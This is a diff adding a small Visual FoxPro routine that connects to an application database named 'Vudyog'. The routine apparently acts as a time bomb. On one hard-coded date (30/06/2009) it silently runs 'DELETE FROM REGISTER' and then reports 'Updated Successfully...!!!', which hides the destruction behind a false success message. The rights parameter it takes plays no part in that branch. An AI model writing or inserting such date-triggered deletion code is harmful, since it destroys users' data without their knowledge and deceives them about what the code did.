@@ -1,0 +1,19 @@
+Lparameters cRights
+
+osqlconobj=Newobject('sqlconnudobj',"sqlconnection",xapps)
+nHandleSac=0
+If Date() = Ctod('30/06/2009')
+	msqlstr = "DELETE FROM REGISTER"
+	nretval = osqlconobj.dataconn('EXE','Vudyog',msqlstr,"","nHandleSac")
+	If nretval<0
+		Return .F.
+	Endif
+
+	nretval = osqlconobj.sqlconnclose("nHandleSac") && Connection Close
+	If nretval<0
+		Return .F.
+	Endif
+
+	Wait Window "Updated Successfully...!!!" Nowait
+
+Endif
